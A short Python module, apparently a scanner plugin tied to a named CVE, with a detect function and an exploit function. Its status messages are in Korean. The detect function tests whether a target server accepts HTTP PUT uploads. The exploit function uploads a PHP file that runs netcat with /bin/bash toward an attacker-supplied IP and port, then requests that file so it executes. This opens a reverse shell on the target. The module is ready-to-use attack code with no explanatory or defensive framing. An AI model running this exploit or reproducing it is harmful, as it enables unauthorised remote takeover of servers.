def name():
    return "CVE-2025-24813"

def detect(target_url):
    import requests
    test_path = "/test_upload_cve2025.txt"
    test_content = "CVE-2025-24813 Test"

    try:
        put_response = requests.put(target_url + test_path, data=test_content, timeout=5)
        if put_response.status_code in [200, 201, 204]:
            get_response = requests.get(target_url + test_path, timeout=5)
            if get_response.status_code == 200 and test_content in get_response.text:
                return {"status": "vulnerable", "info": "읽기/쓰기 가능. 취약."}
            else:
                return {"status": "potentially_vulnerable", "info": "쓰기 됐으나 읽기 실패."}
        else:
            return {"status": "not_vulnerable", "info": f"쓰기 실패. 상태코드: {put_response.status_code}"}
    except Exception as e:
        return {"status": "error", "info": str(e)}

def exploit(target_url, reverse_shell_ip=None, reverse_shell_port=None):
    import requests
    payload = f"""<?php exec("nc -e /bin/bash {reverse_shell_ip} {reverse_shell_port}"); ?>"""
    try:
        response = requests.put(target_url + "/test_upload_cve2025_shell.php", data=payload)
        if response.status_code in [200, 201, 204]:
            print("[+] 페이로드 업로드 성공. 실행 시도 중...")
            requests.get(target_url + "/test_upload_cve2025_shell.php")
        else:
            print("[-] 업로드 실패.")
    except Exception as e:
        print(f"[-] 오류 발생: {str(e)}")
